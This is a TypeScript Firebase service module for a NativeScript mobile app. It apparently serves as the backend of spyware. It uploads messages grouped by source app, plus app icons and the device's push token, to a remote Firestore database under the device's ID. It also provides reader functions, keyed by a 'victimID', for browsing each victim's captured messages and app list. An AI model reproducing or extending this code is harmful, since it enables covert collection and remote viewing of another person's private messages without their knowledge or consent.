import * as firebase from "nativescript-plugin-firebase";
const appSettings = require("tns-core-modules/application-settings");

export default class Firebase {
    push_token:string;
    
    constructor(){
    }

    init(){
        firebase.init({
            onPushTokenReceivedCallback: (token) => {
               console.log("Push token",token);
               this.push_token = token;
            }
        }).then(
        () => {
            console.log("firebase.init done");
        },
        (error) => {
            console.log(`firebase.init error: ${error}`);
        });
    }

    subscribeToTopic(topic){
        return new Promise((resolve,reject) => {
            firebase.subscribeToTopic(topic).then(() => {
                return resolve(true);
            }).catch(err => {
                return reject(err);
            })
        });
    }

    addMessageToCollection(msg,appName,appIcon = null){
        const userID = appSettings.getString("uniqueID");
        this.addToCollection(`messages/${userID ? userID : 'flotting' }/${appName}`,msg);

        this.setApplicationNamesToCollection(`settings/`,userID ? userID : 'flotting',appName,appIcon);
    }

    getMessagesFromCollection(victimID,appName,lastDoc){
        return this.getAllDocuments(`messages/${victimID}/${appName}`,lastDoc);
    }

    getApplicationNamesToCollection(victimID){
        return this.getOneDocument(`settings/`,victimID);
    }

    getAllDocuments(collectionName,lastDoc = null){
        return new Promise((resolve,reject) => {
            let query = firebase.firestore
            .collection(collectionName)
            .orderBy("date","desc");
            if(lastDoc){
                query = query.startAfter(lastDoc);
            }
            
            query.limit(10)
            .get()
            .then(querySnapshot => {
                let snapshots = null;
                if(querySnapshot && querySnapshot.docs){
                    snapshots = querySnapshot.docs.map(doc => {
                        return {
                            id:doc.id,
                            doc,
                            ...doc.data()
                        }
                    })
                }   
               return resolve(snapshots);
            }).catch(err => {
                return reject(err);
            });
        })
    }

    getOneDocument(collectionName,docId){
        return new Promise((resolve,reject) => {
            firebase.firestore
            .collection(collectionName)
            .doc(docId)
            .get()
            .then(document => {
                if(document && document.exists){
                    return resolve(document.data());
                }else{
                    throw new Error("The document does not exist");
                }
            }).catch(err => {
                console.log("Error",err)
                return resolve(null);
            });
        })
    }

    addToCollection(collectionName,obj){
        return new Promise((resolve,reject) => {
            firebase.firestore
            .collection(collectionName)
            .add({
                date:new Date(),
                byUser:appSettings.getString("uniqueID"),
                pushToken:this.push_token,
                ...obj
            })
            .then(documentRef => {
                console.log("Document ref",documentRef.id)
               return resolve(documentRef);
            }).catch(err => {
                console.log("Error",err);
                return reject(err);
            });
        })
    }


    setApplicationNamesToCollection(collectionName,docId,appName,appIcon){
        return new Promise((resolve,reject) => {
            firebase.firestore
            .collection(collectionName)
            .doc(docId)
            .update({
                "application-names": firebase.firestore.FieldValue.arrayUnion(appName),
                "application-icons": firebase.firestore.FieldValue.arrayUnion({appName,appIcon})
            })
            .then(() => {
               return true;
            }).catch(err => {
                return false;
            }).then(answer => {
                if(!answer){
                    firebase.firestore
                    .collection(collectionName)
                    .doc(docId)
                    .set({
                        "application-names": [appName],
                        "application-icons": [{appName,appIcon}]
                    }).then(() => {
                        return resolve(true);
                    }).catch(err =>{
                        return reject(err);
                    });
                }else{
                    return resolve(true);
                }
            });
        })
    }
}